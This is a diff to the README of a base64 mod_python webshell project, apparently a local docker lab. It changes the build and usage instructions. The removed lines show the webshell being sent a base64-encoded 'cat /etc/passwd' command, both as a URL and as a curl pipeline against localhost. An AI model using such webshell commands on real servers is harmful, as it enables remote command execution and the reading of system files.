@@ -1,11 +1,15 @@
 # base64 mod_python webshell
 
 ## build
-docker-compose up -d --build
+```chmod 755 src
+chmod 644 src/*.html
+chmod 644 src/*.py
+
+docker-compose up -d --build```
 
 ## usage
-http://localhost:8001/shell.py/main/?cmd=Y2F0IC9ldGMvcGFzc3dk
+`./client.py`
 
-or
+OR
 
-`echo cat /etc/passwd | tr -d "\n" | base64 | xargs -I {} curl -s http://localhost:8001/shell.py/main/?cmd={} | base64 -d`
+`./client.py GET`
